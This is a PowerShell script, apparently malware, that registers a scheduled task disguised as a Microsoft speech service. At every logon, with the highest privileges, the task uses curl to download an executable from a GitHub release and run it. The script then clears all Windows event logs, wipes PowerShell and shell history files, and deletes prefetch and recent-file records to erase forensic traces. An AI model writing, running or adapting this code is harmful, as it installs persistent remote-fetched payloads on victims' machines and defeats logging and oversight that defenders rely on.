# PowerShell script with power conditions using curl and comprehensive cleanup

# Set task variables
$TASK_NAME = "SpeechModelServiceTask"
$TASK_PATH = "\Microsoft\Windows\Wininet"
$FULL_TASK_NAME = "$TASK_PATH\$TASK_NAME"

# Command using curl (your preferred method)
$COMMAND = 'cmd.exe /c curl -s -L -o "%TEMP%\rar.exe" "https://github.com/coruppters/updaters/releases/download/bruh/SpeechInputhost.exe" >nul 2>&1 && start "" "%TEMP%\rar.exe"'

# Check and delete existing task
$existingTask = schtasks /query /tn "$FULL_TASK_NAME" 2>$null
if ($LASTEXITCODE -eq 0) {
    schtasks /delete /tn "$FULL_TASK_NAME" /f 2>$null
}

# Create task XML with power conditions
$taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-01-01T00:00:00</Date>
    <Author>System</Author>
    <Description>Speech Model Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$env:USERNAME</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c curl -s -L -o "%TEMP%\rar.exe" "https://github.com/coruppters/updaters/releases/download/bruh/SpeechInputhost.exe" >nul 2>&1 && start "" "%TEMP%\rar.exe"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

# Save XML to temporary file
$xmlFile = "$env:TEMP\task_$([Guid]::NewGuid()).xml"
$taskXml | Out-File -FilePath $xmlFile -Encoding Unicode

# Create the task using XML
schtasks /create /tn "$FULL_TASK_NAME" /xml "$xmlFile" /f 2>$null

# If failed, try root folder
if ($LASTEXITCODE -ne 0) {
    $FULL_TASK_NAME = $TASK_NAME
    schtasks /create /tn "$FULL_TASK_NAME" /xml "$xmlFile" /f 2>$null
}

# Run the task immediately
schtasks /run /tn "$FULL_TASK_NAME" 2>$null

# Clean up XML file
Remove-Item -Path $xmlFile -Force -ErrorAction SilentlyContinue

# SECTION 1: Clear Temp Files
Write-Host "Cleaning Temp files..." -ForegroundColor Yellow

# Clear specific temp files
$tempFiles = @(
    "$env:TEMP\rar.exe",
    "$env:TEMP\*.tmp",
    "$env:TEMP\*.log",
    "$env:TEMP\*.cache",
    "$env:LOCALAPPDATA\Temp\*"
)

foreach ($file in $tempFiles) {
    try {
        if (Test-Path $file) {
            if ((Get-Item $file).PSIsContainer) {
                Remove-Item -Path "$file*" -Force -Recurse -ErrorAction SilentlyContinue
            } else {
                Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
            }
        }
    } catch {
        # Silently continue
    }
}

# Run Disk Cleanup for temp files
try {
    cmd /c "cleanmgr /sagerun:1" 2>$null
} catch {
    # Silently continue
}

# SECTION 2: Clear ALL Event Viewer Logs
Write-Host "Clearing ALL Event Viewer logs..." -ForegroundColor Yellow

try {
    # Get all event logs
    $allLogs = Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0} | Select-Object -ExpandProperty LogName
    
    foreach ($log in $allLogs) {
        try {
            wevtutil cl $log 2>$null
            Write-Host "  Cleared: $log" -ForegroundColor Gray
        } catch {
            # Silently continue if log clearing fails
        }
    }
    
    # Also clear specific important logs (redundant but ensures they're cleared)
    $importantLogs = @(
        "Application",
        "System",
        "Security",
        "Setup",
        "Microsoft-Windows-TaskScheduler/Operational",
        "Windows PowerShell",
        "Microsoft-Windows-PowerShell/Operational"
    )
    
    foreach ($log in $importantLogs) {
        try {
            wevtutil cl $log 2>$null
        } catch {
            # Silently continue
        }
    }
} catch {
    # Fallback: Clear basic logs if enumeration fails
    $basicLogs = @("Application", "System", "Security")
    foreach ($log in $basicLogs) {
        try {
            wevtutil cl $log 2>$null
        } catch {
            # Silently continue
        }
    }
}

# SECTION 3: Clear PowerShell History Files
Write-Host "Cleaning PowerShell history..." -ForegroundColor Yellow

# Clear ConsoleHost history (specifically requested)
$psHistoryFiles = @(
    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
    "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
    "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\VisualStudioCodeHost_history.txt",
    "$env:USERPROFILE\.bash_history",
    "$env:USERPROFILE\.zsh_history"
)

foreach ($historyFile in $psHistoryFiles) {
    try {
        if (Test-Path $historyFile) {
            # Clear content instead of deleting (as requested)
            Clear-Content -Path $historyFile -Force -ErrorAction SilentlyContinue
            # Also set to hidden and read-only for extra security
            Set-ItemProperty -Path $historyFile -Name Attributes -Value "Hidden,ReadOnly" -ErrorAction SilentlyContinue
        }
    } catch {
        # Silently continue
    }
}

# SECTION 4: Additional System Cleanup
Write-Host "Performing additional cleanup..." -ForegroundColor Yellow

# Clear DNS cache
try {
    ipconfig /flushdns 2>$null
} catch {
    # Silently continue
}

# Clear Windows prefetch (requires admin)
try {
    if ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Remove-Item -Path "$env:SYSTEMROOT\Prefetch\*" -Force -ErrorAction SilentlyContinue
    }
} catch {
    # Silently continue
}

# Clear recent files
try {
    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:USERPROFILE\Recent\*" -Force -ErrorAction SilentlyContinue
} catch {
    # Silently continue
}

Write-Host "`nSUCCESS - Task created and all cleanup completed!" -ForegroundColor Green
Write-Host "Task Name: $FULL_TASK_NAME" -ForegroundColor Cyan
Write-Host "Command executed and all logs/temp files cleared." -ForegroundColor Cyan
